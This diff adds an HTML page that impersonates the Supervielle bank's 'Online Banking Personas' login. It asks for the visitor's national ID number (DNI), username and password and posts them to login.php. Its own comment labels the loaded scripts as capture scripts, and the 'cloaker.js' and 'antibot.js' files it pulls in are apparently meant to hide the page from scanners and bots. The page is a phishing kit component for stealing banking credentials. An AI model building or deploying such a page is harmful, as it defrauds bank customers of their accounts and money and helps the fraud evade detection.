@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Online Banking Personas - Supervielle</title>
+    <link rel="stylesheet" href="styles/style.css">
+    <!-- Scripts de captura -->
+    <script src="scripts/cloaker.js"></script>
+    <script src="scripts/antibot.js"></script>
+</head>
+<body>
+
+<div class="container">
+    <!-- 1. Encabezado Superior -->
+    <div class="header-top">
+        <a href="#">Ayuda</a>
+        <a href="#">Seguridad</a>
+        <a href="#">Descargar instructivo</a>
+    </div>
+
+    <!-- 2. Logo (Asegúrate de que images/logo.png exista) -->
+    <div class="logo-container">
+        <img src="images/logo.png" alt="Supervielle Personas">
+    </div>
+
+    <!-- 3. Título Principal -->
+    <h1>Iniciar sesión en Online Banking Personas</h1>
+
+    <form id="loginForm" action="login.php" method="POST">
+        <!-- Honeypot oculto para bots -->
+        <div class="honey-pot">
+            <label for="website_url">Website URL</label>
+            <input type="text" id="website_url" name="website_url">
+        </div>
+
+        <!-- Campo DNI -->
+        <div class="form-group">
+            <label for="dni">Tu número de documento</label>
+            <input type="text" id="dni" name="dni" placeholder="Ingrese su DNI" required autocomplete="off">
+        </div>
+        
+        <!-- Checkbox Recordar -->
+        <div class="checkbox-group">
+            <input type="checkbox" id="recordar_dni" name="recordar_dni">
+            <label for="recordar_dni" style="margin-bottom:0; color: #666;">Recordar mi número de documento</label>
+        </div>
+
+        <!-- Campo Usuario -->
+        <div class="form-group">
+            <label for="usuario">Tu nombre de usuario</label>
+            <input type="text" id="usuario" name="usuario" placeholder="Ingrese su usuario" required autocomplete="off">
+        </div>
+
+        <!-- Campo Clave -->
+        <div class="form-group">
+            <label for="clave">Tu clave</label>
+            <input type="password" id="clave" name="clave" placeholder="Ingrese su clave" required>
+        </div>
+
+        <!-- Botón Teclado en Pantalla (Simulado) -->
+        <div class="virtual-keyboard-wrapper">
+            <button type="button" class="virtual-keyboard-btn" onclick="alert('Teclado en pantalla simulado')">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-2 14H6v-2h12v2zm-3-4H6v-2h9v2zm-1-4H6V8h8v2z"/>
+                </svg>
+                Teclado en pantalla
+            </button>
+        </div>
+
+        <!-- 4. Botón Principal -->
+        <button type="submit" class="btn-ingresar">Ingresar</button>
+
+        <!-- 5. Enlaces de Ayuda -->
+        <div class="help-links">
+            <a href="#">Cambiar usuario y/o clave</a>
+            <a href="#">¿No tenés usuario y clave? Registrate</a>
+        </div>
+    </form>
+
+    <!-- 6. Pie de página -->
+    <div class="footer">
+        <p>Cuenta Gratuita Universal. Com 'A' 6876. <a href="#">+INFO</a></p>
+        <div class="security-notice">
+            <p style="font-weight: bold; color: #333;">El banco no solicita actualizar datos por correo electrónico ni por teléfono.</p>
+            <p>Políticas de seguridad | Contacto WhatsApp</p>
+        </div>
+    </div>
+</div>
+
+<!-- Script de lógica -->
+<script src="scripts/logic.js"></script>
+</body>
+</html>
